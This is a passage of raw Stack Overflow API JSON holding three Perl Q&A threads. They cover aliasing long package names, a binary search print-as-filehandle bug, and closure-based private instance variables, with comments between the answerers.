"user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "reply_to_user": {"reputation": 713, "user_id": 1164030, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/jTP9g.png?s=128&g=1", "display_name": "gogators", "link": "https://stackoverflow.com/users/1164030/gogators"}, "edited": false, "score": 1, "creation_date": 1457386402, "post_id": 35831555, "comment_id": 59374608, "body": "@gogators: the alias is in essence creating a global variable %ThirdPackage::.  this is bad for all the usual reasons global variables are bad.  e.g. what happens when there&#39;s also a Vendor2::Foo::Bar::ThirdPackage that you also want to alias?"}, {"owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "reply_to_user": {"reputation": 713, "user_id": 1164030, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/jTP9g.png?s=128&g=1", "display_name": "gogators", "link": "https://stackoverflow.com/users/1164030/gogators"}, "edited": false, "score": 1, "creation_date": 1457386488, "post_id": 35831555, "comment_id": 59374653, "body": "I actually think bart&#39;s answer is a lot better."}], "tags": [], "owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "is_accepted": true, "score": 7, "last_activity_date": 1457292995, "creation_date": 1457292995, "answer_id": 35831555, "question_id": 35831183, "link": "https://stackoverflow.com/questions/35831183/dealing-with-deep-package-names-in-perl-and-their-exported-constants-and-subrout/35831555#35831555", "title": "Dealing with deep package names in perl and their exported constants and subroutines", "body": "<pre><code>use Package::Alias 'ThirdPackage' =&gt; 'Vendor::FirstPackage::SecondPackage::ThirdPackage';\n</code></pre>\n\n<p>But I'd recommend just using the fully qualified name.</p>\n"}], "owner": {"reputation": 713, "user_id": 1164030, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/jTP9g.png?s=128&g=1", "display_name": "gogators", "link": "https://stackoverflow.com/users/1164030/gogators"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 66, "favorite_count": 0, "accepted_answer_id": 35831555, "answer_count": 3, "score": 1, "last_activity_date": 1457293082, "creation_date": 1457291049, "last_edit_date": 1457293082, "question_id": 35831183, "link": "https://stackoverflow.com/questions/35831183/dealing-with-deep-package-names-in-perl-and-their-exported-constants-and-subrout", "title": "Dealing with deep package names in perl and their exported constants and subroutines", "body": "<p>This has probably been asked before, but I'm not sure what to search for. The problem is that I'm dealing with a package that is 4 directories deep and has a rather long name. Within the package are some exported constants that I want to use in main, but I don't want to use their fully qualified names, nor do I want to use their local name (the part after the last ::). For example.</p>\n\n<pre><code>use strict;\nuse warnings;\nuse Vendor::FirstPackage::SecondPackage::ThirdPackage qw(const_a);\n\n# this is works, but I want to include the last package\nmy $x = const_a;\n\n# this throws bareword error\nmy $y = ThirdPackage::const_a;\n\n# this throws undefined subroutine \nmy $z = ThirdPackage::const_a();\n</code></pre>\n\n<p>Is there a way to access the constant via it's last package name?</p>\n"}, {"tags": ["perl", "binary-search"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1457296357, "post_id": 35830506, "comment_id": 59331212, "body": "Please show how you are calling <code>binarysearch</code>. I can work out how it <i>should</i> look from what you have shown, but you need to show your calling code as well as any data files"}], "answers": [{"comments": [{"owner": {"reputation": 51, "user_id": 5792440, "user_type": "registered", "accept_rate": 80, "profile_image": "https://graph.facebook.com/10153317678482060/picture?type=large", "display_name": "Martha Elena Ibarra", "link": "https://stackoverflow.com/users/5792440/martha-elena-ibarra"}, "edited": false, "score": 0, "creation_date": 1457288211, "post_id": 35830604, "comment_id": 59328148, "body": "Thank you :) Then the problem is that the subroutine doesn&quot;t send the &quot;found&quot; value to the main thing when the number is present. it just ignores it :&#39;("}], "tags": [], "owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "is_accepted": false, "score": 3, "last_activity_date": 1457288086, "creation_date": 1457288086, "answer_id": 35830604, "question_id": 35830506, "link": "https://stackoverflow.com/questions/35830506/binary-search-cant-use-string-1-as-a-symbol-ref-while-strict-refs-is-in-use/35830604#35830604", "title": "Binary search\u2014Can&#39;t use string &quot;1&quot; as a symbol ref while strict refs is in use", "body": "<p>You want</p>\n\n<pre><code>print $found, \"\\n\";\n</code></pre>\n\n<p>Or</p>\n\n<pre><code>print $found . \"\\n\";\n</code></pre>\n\n<p>With no operator between $found and the newline, it thinks $found is the filehandle to print a newline to, and is getting  an error because it isn't a filehandle.</p>\n"}, {"comments": [{"owner": {"reputation": 51, "user_id": 5792440, "user_type": "registered", "accept_rate": 80, "profile_image": "https://graph.facebook.com/10153317678482060/picture?type=large", "display_name": "Martha Elena Ibarra", "link": "https://stackoverflow.com/users/5792440/martha-elena-ibarra"}, "edited": false, "score": 0, "creation_date": 1457288434, "post_id": 35830613, "comment_id": 59328232, "body": "Thank you.It worked :)  Now, if I can be evil and ask more, if i try to print the $found just before the end it gives me the &quot;use of an uninitialized value&quot; at the end. Could you help me there please?"}, {"owner": {"reputation": 6592, "user_id": 3005251, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a5331f7e467aae3d581fe8bc814ef572?s=128&d=identicon&r=PG", "display_name": "bolav", "link": "https://stackoverflow.com/users/3005251/bolav"}, "reply_to_user": {"reputation": 51, "user_id": 5792440, "user_type": "registered", "accept_rate": 80, "profile_image": "https://graph.facebook.com/10153317678482060/picture?type=large", "display_name": "Martha Elena Ibarra", "link": "https://stackoverflow.com/users/5792440/martha-elena-ibarra"}, "edited": false, "score": 0, "creation_date": 1457288656, "post_id": 35830613, "comment_id": 59328311, "body": "What do you mean with &quot;just before the end&quot;?"}, {"owner": {"reputation": 51, "user_id": 5792440, "user_type": "registered", "accept_rate": 80, "profile_image": "https://graph.facebook.com/10153317678482060/picture?type=large", "display_name": "Martha Elena Ibarra", "link": "https://stackoverflow.com/users/5792440/martha-elena-ibarra"}, "edited": false, "score": 0, "creation_date": 1457288931, "post_id": 35830613, "comment_id": 59328409, "body": "just before the &quot;return $found;&quot; line :)"}, {"owner": {"reputation": 51, "user_id": 5792440, "user_type": "registered", "accept_rate": 80, "profile_image": "https://graph.facebook.com/10153317678482060/picture?type=large", "display_name": "Martha Elena Ibarra", "link": "https://stackoverflow.com/users/5792440/martha-elena-ibarra"}, "edited": false, "score": 0, "creation_date": 1457288971, "post_id": 35830613, "comment_id": 59328424, "body": "but the thing is that the function doesn&#39;t return &quot;1&quot;, it gives me always &quot;-1&quot; and i really don&#39;t understand why :("}, {"owner": {"reputation": 6592, "user_id": 3005251, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a5331f7e467aae3d581fe8bc814ef572?s=128&d=identicon&r=PG", "display_name": "bolav", "link": "https://stackoverflow.com/users/3005251/bolav"}, "reply_to_user": {"reputation": 51, "user_id": 5792440, "user_type": "registered", "accept_rate": 80, "profile_image": "https://graph.facebook.com/10153317678482060/picture?type=large", "display_name": "Martha Elena Ibarra", "link": "https://stackoverflow.com/users/5792440/martha-elena-ibarra"}, "edited": false, "score": 0, "creation_date": 1457288972, "post_id": 35830613, "comment_id": 59328425, "body": "Then it didn&#39;t find the value in the array."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1457298830, "post_id": 35830613, "comment_id": 59332131, "body": "@bolav: As I understand it, the purpose of this exercise is to code a binary search in pure Perl. If you&#39;re going to involve <code>List::Util</code> at all then the program may as well just use <code>sort</code>."}], "tags": [], "owner": {"reputation": 6592, "user_id": 3005251, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a5331f7e467aae3d581fe8bc814ef572?s=128&d=identicon&r=PG", "display_name": "bolav", "link": "https://stackoverflow.com/users/3005251/bolav"}, "is_accepted": false, "score": 1, "last_activity_date": 1457338742, "last_edit_date": 1457338742, "creation_date": 1457288108, "answer_id": 35830613, "question_id": 35830506, "link": "https://stackoverflow.com/questions/35830506/binary-search-cant-use-string-1-as-a-symbol-ref-while-strict-refs-is-in-use/35830613#35830613", "title": "Binary search\u2014Can&#39;t use string &quot;1&quot; as a symbol ref while strict refs is in use", "body": "<p>If you call print with several parameters separated with a space print expects the first one to be a filehandle. This is interprented as <code>print FILEHANDLE LIST</code> from the <a href=\"http://perldoc.perl.org/functions/print.html\" rel=\"nofollow\">documentation</a>.</p>\n\n<pre><code>print $found \"\\n\";\n</code></pre>\n\n<p>What you want to do is either to separate with <code>,</code>, to call it as <code>print LIST</code>.</p>\n\n<pre><code>print $found, \"\\n\";\n</code></pre>\n\n<p>or to concat as strings, which will also call it as <code>print LIST</code>, but with only one element in <code>LIST</code>.</p>\n\n<pre><code>print $found . \"\\n\";\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": true, "score": 1, "last_activity_date": 1457304642, "creation_date": 1457304642, "answer_id": 35833618, "question_id": 35830506, "link": "https://stackoverflow.com/questions/35830506/binary-search-cant-use-string-1-as-a-symbol-ref-while-strict-refs-is-in-use/35833618#35833618", "title": "Binary search\u2014Can&#39;t use string &quot;1&quot; as a symbol ref while strict refs is in use", "body": "<p>I'll try to help</p>\n\n<p>First of all, as simple as it may seem, a binary search is quite difficult to code correctly. The main reason is that it's a hotbed of off-by-one errors, which are so prevalent that they have their own <a href=\"https://en.wikipedia.org/wiki/Off-by-one_error\" rel=\"nofollow\">Wikipedia page</a></p>\n\n<p>The issue is that an array containing, say, the values <code>A</code> to <code>Z</code> will have 26 elements with indices 0 to 25. I think FORTRAN bucks the trend, and Lua, but pretty much every other language has the first element of an array at index zero</p>\n\n<p>A zero base works pretty well for everything until you start using <a href=\"https://en.wikipedia.org/wiki/Divide_and_conquer_algorithms\" rel=\"nofollow\"><em>divide and conquer</em> algorithms</a>. Merge Sort as well as Binary Search are such algorithms. Binary search goes</p>\n\n<ul>\n<li>Is it in the first half?</li>\n<li>If so then search the first half further</li>\n<li>Else search the second half further</li>\n</ul>\n\n<p>The hard part is when you have to decide when you've found the object, or when you need to give up looking. Splitting data in two nearly-halves is easy. Knowing when to stop is <em>hard</em></p>\n\n<p>It's highly efficient for sorted data, but the problem comes when implementing it that, if we do it properly, we have to deal with all sorts of weird index bases beyond zero or one.</p>\n\n<p>Suppose I have an array</p>\n\n<pre><code>my @alpha = 'A' .. 'Q'\n</code></pre>\n\n<p>If I <code>print scalar @alpha</code> I will see 17, meaning the array has seventeen elements, indexed from 0 to 16</p>\n\n<p>Now I'm looking for <code>E</code> in that array, so I do a binary search, so I want the \"first half\" and the \"second half\" of <code>@alpha</code>. If I add 0 to 16 and divide by 2 I get a neat \"8\", so the middle element is at index 8, which is <code>H</code></p>\n\n<p>But wait. There are 17 elements, which is an odd number, so if we say the first eight (<code>A</code> .. <code>H</code>) are left of the middle and the last eight (<code>I</code> .. <code>Q</code>) are right of the middle then surely the \"middle\" is <code>I</code>?</p>\n\n<p>In truth this is all a deception, because a binary search will work however we partition the data. In this case <em>binary</em> means two parts, and although the search would be more efficient if those parts could be equal in size it's not necessary for the algorithm to work. So it can be the first third and the last two-thirds, or just the first element and the rest</p>\n\n<p>That's why using <code>int(($low+high)/2)</code> is fine. It rounds down to the nearest integer so that with our 17-element array <code>$mid</code> is a usable 8 instead of 8.5</p>\n\n<p>But your code still has to account for some unexpected things. In the case of our 17-element array we have calculated the middle index to be 8. So indexes 0 .. 7 are the \"first half\" while 8 .. 16 are the \"second half\", and the middle index is where the second half starts</p>\n\n<p>But didn't we round the division <em>down</em>? So in the case of an odd number of elements, shouldn't our mid point be at the end of the first half, and not the start of the second? This is an arcane off-by-one error, but let's see if it still works with a simple even number of elements</p>\n\n<pre><code>@alpha = `A` .. `D`\n</code></pre>\n\n<p>The start and and indices are 0 and 3; the middle index is <code>int((0+3)/2)</code> == 1. So the first half is 0..1 and the second half is 2 .. 3. That works fine</p>\n\n<p>But there's still a lot more. Say I have to search an array with two elements <code>X</code> and <code>Y</code>. That has two clear halves, and I'm looking for <code>A</code>, which is before the middle. So I now search the one-element list <code>X</code> for <code>A</code>. The minimum and maximum elements of the target array are both zero. The mid-point is <code>int((0+0)/2)</code> == 0. So what happens next?</p>\n\n<p>It is similar but rather worse when we're searching for <code>Z</code> in the same list. The code has to be exactly right, otherwise we will be either searching off the end of the array or checking the last element again and again</p>\n\n<p>Saving the worst for last, suppose</p>\n\n<pre><code>my @alpha = ( 'A', 'B, 'Y, 'Z' )\n</code></pre>\n\n<p>and I'm looking for <code>M</code>. That lest loose all sorts of optimisations that involve checks that may may the ordinary case much slower</p>\n\n<p>Because of all of this it's by far the best solution to use a library or a language's built-in function to do all of this. In particular, Perl's hashes are usually all you need to check for specific strings and any associated data. The algorithm used is vastly better than a binary search for any non-trivial data sets</p>\n\n<p>Wikipedia shows <a href=\"https://en.wikipedia.org/wiki/Binary_search_algorithm#Iterative\" rel=\"nofollow\">this algorithm</a> for an iterative binary search</p>\n\n<blockquote>\n  <p>The binary search algorithm can also be expressed iteratively with two index limits that progressively narrow the search range.</p>\n\n<pre><code>   int binary_search(int A[], int key, int imin, int imax)\n   {\n     // continue searching while [imin,imax] is not empty\n     while (imin &lt;= imax)\n       {\n         // calculate the midpoint for roughly equal partition\n         int imid = midpoint(imin, imax);\n         if (A[imid] == key)\n           // key found at index imid\n           return imid;\n         // determine which subarray to search\n         else if (A[imid] &lt; key)\n           // change min index to search upper subarray\n           imin = imid + 1;\n         else        \n           // change max index to search lower subarray\n           imax = imid - 1;\n       }\n     // key was not found\n     return KEY_NOT_FOUND;\n   }\n</code></pre>\n</blockquote>\n\n<p>And here is a version of your code that is far from bug-free but does what you intended. You weren't so far off</p>\n\n<pre><code>use strict;\nuse warnings 'all';\n\nprint binarysearch( 76, 10 .. 99 ), \"\\n\";\n\nsub binarysearch {\n\n    my $numbertolook = shift;\n    my @intarray     = @_;\n    my $lengthint    = scalar @intarray;\n    my @sorted       = sort { $a &lt;=&gt; $b } @intarray;\n\n    my $low   = 0;\n    my $high  = $lengthint - 1;\n    my $found = undef;\n    my $midpoint;\n\n    while ( $low &lt; $high ) {\n        $midpoint = int( ( $low + $high ) / 2 );\n\n        #print $midpoint, \" \",$low,\" \", $high, \" \", @sorted, \"\\n\";\n        if ( $numbertolook &lt; $sorted[$midpoint] ) {\n            $high = $midpoint;\n        }\n        elsif ( $numbertolook &gt; $sorted[$midpoint] ) {\n            $low = $midpoint;\n        }\n        elsif ( $numbertolook == $sorted[$midpoint] ) {\n            $found = 1;\n            print \"FOUND\\n\";\n            return $midpoint;\n        }\n\n        if ( $low == $high - 1 and $low == $midpoint ) {\n            if ( $numbertolook == $sorted[$high] ) {\n                $found = 1;\n                print \"FOUND\\n\";\n                return $midpoint;\n            }\n            return;\n        }\n\n    }\n\n    return $midpoint;\n}\n</code></pre>\n\n<h3>output</h3>\n\n<pre><code>FOUND\n66\n</code></pre>\n"}], "owner": {"reputation": 51, "user_id": 5792440, "user_type": "registered", "accept_rate": 80, "profile_image": "https://graph.facebook.com/10153317678482060/picture?type=large", "display_name": "Martha Elena Ibarra", "link": "https://stackoverflow.com/users/5792440/martha-elena-ibarra"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 410, "favorite_count": 0, "accepted_answer_id": 35833618, "answer_count": 3, "score": 2, "last_activity_date": 1457338742, "creation_date": 1457287628, "last_edit_date": 1457304914, "question_id": 35830506, "link": "https://stackoverflow.com/questions/35830506/binary-search-cant-use-string-1-as-a-symbol-ref-while-strict-refs-is-in-use", "title": "Binary search\u2014Can&#39;t use string &quot;1&quot; as a symbol ref while strict refs is in use", "body": "<p>I've been browsing over the already answered questions regarding this error message.</p>\n\n<p>I am trying to solve a problem from the <a href=\"http://rosalind.info/problems/locations/\" rel=\"nofollow\">Rosalind web site</a> that looks for some indexes using a binary search. </p>\n\n<p>When my subroutine finds the number it seems to ignore it, and if I try to print the <code>$found</code> variable, it gives me the error </p>\n\n<blockquote>\n  <p>Can't use string \"1\" as a symbol ref while strict refs is in use</p>\n</blockquote>\n\n<p>The code is this</p>\n\n<pre><code>sub binarysearch\n{\n  my $numbertolook = shift;\n  my @intarray=@_;\n  my $lengthint = scalar @intarray;\n  my @sorted = sort {$a &lt;=&gt; $b} @intarray;\n  #print $numbertolook, \" \" , @sorted, \"\\n\";\n  my $low=0;\n  my $high=$lengthint-1;\n  my $found =undef;\n  my $midpoint;\n     while ($low&lt;$high)\n     {\n     $midpoint=int(($low+$high)/2);\n     #print $midpoint, \" \",$low,\" \", $high, \" \", @sorted, \"\\n\";\n        if ($numbertolook&lt;$sorted[$midpoint])\n        {\n            $high=$midpoint;\n        }\n        elsif ($numbertolook&gt;$sorted[$midpoint])\n        {\n           $low=$midpoint;\n        }\n        elsif ($numbertolook==$sorted[$midpoint])\n        {\n           $found=1;\n           print $found \"\\n\";\n           last;\n        }\n        if ($low==$high-1 and $low==$midpoint)\n        {\n            if ($numbertolook==$sorted[$high])\n            {\n                $found=1;\n                print $found \"\\n\";\n                last;\n            }\n            $low=$high;\n        }\n\n     }\n\n  return $found;\n\n} \n</code></pre>\n"}, {"tags": ["oop", "variables", "instance", "perl"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1457277312, "post_id": 35828283, "comment_id": 59323797, "body": "I have edited your question to make it more readable. Please check to make sure it is still correct. But I&#39;m afraid I have never heard of a <i>resp. variable</i>; what do you mean by that?"}, {"owner": {"reputation": 44, "user_id": 5919531, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5f3f86a7779531643d0ca5cf0d5f16e4?s=128&d=identicon&r=PG&f=1", "display_name": "Denis Komnenovic", "link": "https://stackoverflow.com/users/5919531/denis-komnenovic"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1457277811, "post_id": 35828283, "comment_id": 59323976, "body": "It was a mistake, there are not any resp. vars. What i mean is that you can always call perl-variable throw the package-name (class-name) and in a same time throw an instance and this is to example in Java not possible, an instance variable is a instance variable and a class variable is a class variable, maybe i fail my question a little bit, so to complete it, i would like to have real private instance variable in perl."}, {"owner": {"reputation": 30226, "user_id": 2107876, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/975e7190aac72397465126f04f46f3f6?s=128&d=identicon&r=PG", "display_name": "laune", "link": "https://stackoverflow.com/users/2107876/laune"}, "edited": false, "score": 0, "creation_date": 1457278298, "post_id": 35828283, "comment_id": 59324210, "body": "@DenisKomnenovic s/throw/through/ unless I&#39;m mistaken. Edited your Q."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1457279266, "post_id": 35828283, "comment_id": 59324628, "body": "After several attempts to ask what you want to achieve and why, I have to mark this question as <b><i>unclear what you&#39;re asking</i></b>"}, {"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 0, "creation_date": 1457280423, "post_id": 35828283, "comment_id": 59325057, "body": "Before you go down the wrong path, do read <a href=\"http://stackoverflow.com/a/35828756/100754\">David Golden&#39;s excellent presentation</a> linked from my answer."}, {"owner": {"reputation": 3432, "user_id": 604642, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/48daad611ba387f8473b0c1e5792aa3f?s=128&d=identicon&r=PG", "display_name": "shawnhcorey", "link": "https://stackoverflow.com/users/604642/shawnhcorey"}, "edited": false, "score": 0, "creation_date": 1468509545, "post_id": 35828283, "comment_id": 64166194, "body": "Download an appropriate package from CPAN. Don&#39;t reinvent (and re-debug) code. You&#39;ll save time, money, and frustration. And you&#39;ll get security patches for issues you don&#39;t even know exist. :)"}], "answers": [{"comments": [{"owner": {"reputation": 44, "user_id": 5919531, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5f3f86a7779531643d0ca5cf0d5f16e4?s=128&d=identicon&r=PG&f=1", "display_name": "Denis Komnenovic", "link": "https://stackoverflow.com/users/5919531/denis-komnenovic"}, "edited": false, "score": 0, "creation_date": 1457278387, "post_id": 35828387, "comment_id": 59324256, "body": "This looks nice, thanks for the advice. But i get still the problem, that i can call this variable using the package name (class name), but i would like to have real private &quot;instance&quot; variable. Now i thing, maybe i should define the getters in a way, that they just allow a reference/instance call. Eugen thanks so fare."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1457278425, "post_id": 35828387, "comment_id": 59324272, "body": "Your <code>set</code> and <code>get</code> aren&#39;t methods, and even if you allow for you forgetting to write <code>my $self = shift</code> then your $x is a <i>class variable</i> that is shared with every object created in the same class"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 44, "user_id": 5919531, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5f3f86a7779531643d0ca5cf0d5f16e4?s=128&d=identicon&r=PG&f=1", "display_name": "Denis Komnenovic", "link": "https://stackoverflow.com/users/5919531/denis-komnenovic"}, "edited": false, "score": 0, "creation_date": 1457278526, "post_id": 35828387, "comment_id": 59324312, "body": "@DenisKomnenovic: No, you can&#39;t access variables declared with <code>my</code> using the package. They are not package variables. Please explain what problem you are trying to solve. Are you hoping to defend yourself against hackers, or just bad programming?"}, {"owner": {"reputation": 15304, "user_id": 4632019, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/8937eb40752cf51c7da61bd4a322a4ef?s=128&d=identicon&r=PG&f=1", "display_name": "Eugen Konkov", "link": "https://stackoverflow.com/users/4632019/eugen-konkov"}, "reply_to_user": {"reputation": 44, "user_id": 5919531, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5f3f86a7779531643d0ca5cf0d5f16e4?s=128&d=identicon&r=PG&f=1", "display_name": "Denis Komnenovic", "link": "https://stackoverflow.com/users/5919531/denis-komnenovic"}, "edited": false, "score": 0, "creation_date": 1457278583, "post_id": 35828387, "comment_id": 59324332, "body": "@DenisKomnenovic Nope. You can not refer $x variable in my example with package like $Pkg::x . You miss something. Please post examples."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1457278871, "post_id": 35828387, "comment_id": 59324468, "body": "@EugenKonkov: I think that the issue of whether or not <code>$x</code> can be accessed using a package name is irrelevant since you haven&#39;t written a proper class. Show something that has a <code>new</code> method that I can call to return an object with <code>set</code> and <code>get</code> methods"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1457279958, "post_id": 35828387, "comment_id": 59324882, "body": "@EugenKonkov: You&#39;re digging yourself a deeper hole. You&#39;ve clearly &quot;seen this somewhere&quot; and never used it. Your solution doesn&#39;t contain any code that I can copy and run (you still don&#39;t have a <code>new</code>) and, as I said before, every instance would share what was <code>$x</code> and is now <code>$storage</code>"}, {"owner": {"reputation": 15304, "user_id": 4632019, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/8937eb40752cf51c7da61bd4a322a4ef?s=128&d=identicon&r=PG&f=1", "display_name": "Eugen Konkov", "link": "https://stackoverflow.com/users/4632019/eugen-konkov"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1457280318, "post_id": 35828387, "comment_id": 59325022, "body": "@Borodin: What problems you have with code? I run it without problem and private values are not shared between objects."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1457280847, "post_id": 35828387, "comment_id": 59325267, "body": "@EugenKonkov: This will be my last comment. You&#39;re now using the hash referred to by <code>$storage</code> (a class variable, so the block is unnecessary) but indexing it by the <i>stringification</i> of the hash reference that is assigned to each object. So you&#39;re using <code>{}</code> to create unique object IDs like <code>HASH(0x6bc300)</code>. That is one way of doing things, but it doesn&#39;t answer the OP&#39;s problem and it&#39;s pretty nasty"}, {"owner": {"reputation": 15304, "user_id": 4632019, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/8937eb40752cf51c7da61bd4a322a4ef?s=128&d=identicon&r=PG&f=1", "display_name": "Eugen Konkov", "link": "https://stackoverflow.com/users/4632019/eugen-konkov"}, "edited": false, "score": 0, "creation_date": 1457281367, "post_id": 35828387, "comment_id": 59325502, "body": "<code>{}</code> we require to restrict access only to <code>get&#47;set</code> in other case other class methods in this file will have access to <code>$storage</code>."}], "tags": [], "owner": {"reputation": 15304, "user_id": 4632019, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/8937eb40752cf51c7da61bd4a322a4ef?s=128&d=identicon&r=PG&f=1", "display_name": "Eugen Konkov", "link": "https://stackoverflow.com/users/4632019/eugen-konkov"}, "is_accepted": false, "score": -2, "last_activity_date": 1457280126, "last_edit_date": 1457280126, "creation_date": 1457276283, "answer_id": 35828387, "question_id": 35828283, "link": "https://stackoverflow.com/questions/35828283/oo-paradigm-and-encapsulated-instance-variables-in-perl5/35828387#35828387", "title": "OO paradigm and encapsulated instance variables in Perl5", "body": "<p>To do really private variables you should use closures:</p>\n\n<pre><code>{\n    my $x;\n\n    sub get {\n        return $x;\n    }\n\n    sub set {\n        $x =  shift;\n    }\n}\n\nset( 3 );\nprint get(); # prints 3\nprint $x; # ERROR\n\n# Example with objects\npackage Class;\n\nsub new {\n    bless {}, 'Class';\n}\n{\n    my $storage =  {};\n\n    sub get {\n        $self =  shift;\n        return $storage-&gt;{ \"$self\" };            \n    }\n\n    sub set {\n        $self =  shift;\n        $storage-&gt;{ \"$self\" } =  shift;\n    }\n}\n\npackage main;\nprint Class::x; #ERROR\n\n$z = Class::new();\n$z-&gt;set( 3 );\n\n$y = Class::new();\n$y-&gt;set( 5 );\nprint $y-&gt;get(); # 5\nprint $z-&gt;get(); # 3\n</code></pre>\n\n<p>The <code>$x</code> is local to the block. None except <code>set</code> and <code>get</code> may access it.<br>\n\"$self\" will be like \"Class=HASH(0x1cf9160)\". Because of each object has its own address in memory \"$self\" will never collision. </p>\n\n<p>But actually you are not required to do so in other case that will be <strong>a stick in your wheel</strong></p>\n"}, {"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": 